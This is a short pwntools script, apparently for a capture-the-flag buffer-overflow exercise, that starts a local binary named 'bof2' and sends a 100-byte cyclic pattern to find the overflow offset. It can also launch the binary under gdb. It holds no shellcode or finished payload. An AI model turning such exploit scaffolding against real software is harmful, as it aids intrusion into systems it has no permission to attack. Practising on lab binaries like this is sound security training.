#!/usr/bin/env python3
import sys
import time
import argparse
from pwn import *
context.update(arch='i386', os='linux')

def wait_for_prompt(r):
  r.recvuntil(b"overflow me :")

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  args = parser.parse_args()
  exe = './bof2'

  if args.dbg:
    r = gdb.debug([exe], gdbscript="""
    b *func
    continue
    """)
  else:
    r = process(exe)

  wait_for_prompt(r)
  payload  = cyclic(100)
  r.sendline(payload) 

  # Drop to interactive console
  r.interactive()

